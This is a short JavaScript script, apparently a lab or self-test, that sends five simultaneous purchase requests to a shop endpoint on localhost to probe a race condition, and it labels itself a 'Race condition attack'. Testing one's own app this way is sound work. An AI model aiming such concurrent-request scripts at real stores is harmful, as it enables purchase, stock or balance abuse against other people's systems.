const productId = 3; // Target product ID
const url = "http://localhost:3000/shop/buy"; // Adjust port if necessary

/* eslint-disable no-undef */
async function buyProduct(user) {
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ productId }),
    });

    const result = await response.json();
    return result;
  } catch (error) {
    console.log(`${user} Response is: ${error}`);
  }
}

console.log("Starting purchase simulation Race condition attack...");

Promise.all([
  buyProduct("A"),
  buyProduct("B"),
  buyProduct("C"),
  buyProduct("D"),
  buyProduct("E"),
]);
